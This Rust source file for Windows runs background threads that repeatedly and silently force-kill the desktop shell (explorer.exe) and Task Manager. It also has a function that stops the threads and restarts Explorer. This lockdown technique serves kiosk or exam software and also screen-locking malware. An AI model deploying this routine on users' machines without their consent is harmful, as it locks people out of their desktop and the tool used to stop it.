use std::{
    ffi::OsStr,
    os::windows::process::CommandExt,
    process::Command,
    sync::{
        atomic::{AtomicBool, Ordering},
        RwLock,
    },
    thread::JoinHandle,
    time::Duration,
};

use winapi::um::winbase::CREATE_NO_WINDOW;

const NO_SUCH_PROCESS: i32 = 128;
const KILL_DELAY: u64 = 5000;

static ACTIVE: AtomicBool = AtomicBool::new(false);

lazy_static::lazy_static! {
    static ref THREADS: RwLock<Vec<JoinHandle<()>>> = RwLock::new(Vec::new());
}

pub fn spawn_serial_taskkillers() {
    // If already active, despawn the existing threads
    if ACTIVE.load(Ordering::Relaxed) {
        despawn_serial_taskkillers();
    }

    // Set global active to true (allows threads to execute)
    ACTIVE.store(true, Ordering::Relaxed);

    // Get a lock on the threads
    let mut threads = THREADS.write().unwrap();

    // Spawn a thread to kill explorer (desktop shell) process repeatedly
    threads.push(spawn_killer("explorer.exe"));

    // Spawn a thread to kill task manager repeatedly
    threads.push(spawn_killer("taskmgr.exe"));
}

pub fn despawn_serial_taskkillers() {
    // If not already active, no nothing
    if !ACTIVE.load(Ordering::Relaxed) {
        return;
    }

    // Set global active to false (will cause the threads to exit)
    ACTIVE.store(false, Ordering::Relaxed);

    // Get a lock on the threads
    let mut threads = THREADS.write().unwrap();

    // Remove all the threads and join one by one
    while !threads.is_empty() {
        let thread = threads.pop().unwrap();
        thread.join().unwrap()
    }

    // Respawn important tasks
    respawn_tasks();
}

fn respawn_tasks() {
    Command::new("explorer")
        .spawn()
        .expect("Could not restart explorer");
}

fn spawn_killer(name: &'static str) -> JoinHandle<()> {
    std::thread::spawn(move || loop {
        // Break from genocide if program is exiting gracefully
        if !ACTIVE.load(Ordering::Relaxed) {
            break;
        }

        // Kill the specified process
        kill_process(name);

        // Wait a bit before trying again
        std::thread::sleep(Duration::from_millis(KILL_DELAY))
    })
}

fn kill_process<S>(name: S)
where
    S: AsRef<OsStr>,
{
    let status = Command::new("taskkill")
        .args([
            "/f",
            "/im",
            name.as_ref()
                .to_str()
                .expect("Could not parse process name"),
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .status()
        .expect("Failed to exec taskkill");

    if !status.success() && status.code().unwrap() != NO_SUCH_PROCESS {
        panic!("Failed to kill {:?}", name.as_ref())
    }
}
